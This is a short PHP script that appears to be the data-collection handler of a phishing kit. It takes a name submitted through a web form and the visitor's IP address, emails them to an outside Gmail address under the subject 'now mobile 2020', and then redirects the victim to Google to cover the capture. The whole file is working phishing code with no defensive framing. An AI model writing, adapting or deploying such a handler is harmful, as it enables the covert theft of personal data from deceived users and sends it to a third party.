<?
$ip = getenv("REMOTE_ADDR");
$message .= "-------------------------------------\n";
$message .= ".   Name            : ".$_POST['Name']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------------------------------------\n";



$subject = "now mobile 2020 - $ip";

mail("nowinfoonne@gmail.com",$subject,$message);


header("Location: https://m.google.com/");
?>
